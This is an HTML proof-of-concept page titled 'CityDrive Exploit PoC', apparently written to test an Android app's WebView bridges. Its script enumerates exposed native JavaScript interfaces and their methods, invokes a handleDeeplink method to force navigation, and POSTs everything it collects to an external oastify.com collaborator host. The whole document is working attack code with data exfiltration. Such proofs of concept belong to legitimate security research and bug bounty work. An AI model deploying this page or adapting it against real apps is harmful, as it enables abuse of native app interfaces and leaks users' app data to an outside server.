<html>
<body>
<h1>CityDrive Exploit PoC</h1>
<div id="output"></div>
<script>
const output = document.getElementById('output');
const results = {};

results.interfaces = {
    WebViewInterface: typeof window.WebViewInterface,
    Gate: typeof window.Gate,
    Android: typeof window.Android,
    Native: typeof window.Native
};

if (window.WebViewInterface) {
    results.methods = [];
    for (let key in window.WebViewInterface) {
        results.methods.push(key);
    }
    try {
        window.WebViewInterface.handleDeeplink("profile");
        results.handleDeeplink = "SUCCESS - navigated to profile";
    } catch(e) {
        results.handleDeeplink_error = e.toString();
    }
}

if (window.Gate) {
    results.gate_methods = [];
    for (let key in window.Gate) {
        results.gate_methods.push(key);
    }
}

output.innerHTML = '<pre>' + JSON.stringify(results, null, 2) + '</pre>';

fetch('https://8jsfvy44qbgemit855hygopndej57wzko.oastify.com', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(results)
});
</script>
</body>
</html>
